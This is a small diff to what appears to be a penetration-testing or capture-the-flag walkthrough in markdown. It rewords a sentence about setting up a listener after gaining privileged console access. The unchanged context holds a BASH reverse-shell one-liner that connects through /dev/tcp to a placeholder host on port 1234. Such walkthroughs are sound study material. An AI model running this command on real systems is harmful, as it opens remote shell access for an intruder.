@@ -109,7 +109,7 @@ But we need a shell to operate more flexibly.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806383-709bfcfa-928e-49b6-b1fc-032eacd73d21.png)
 
-So, we setup a listener and using a BASH reverse shell to connect to the listener:
+So, we setup a listener and using a BASH reverse shell to connect to the listener; putting the script below inside the console that we just took privilege:
 
 >bash -i >& /dev/tcp/<i><b>[host-ip]</b></i>/1234 0>&1 (host machine)
 
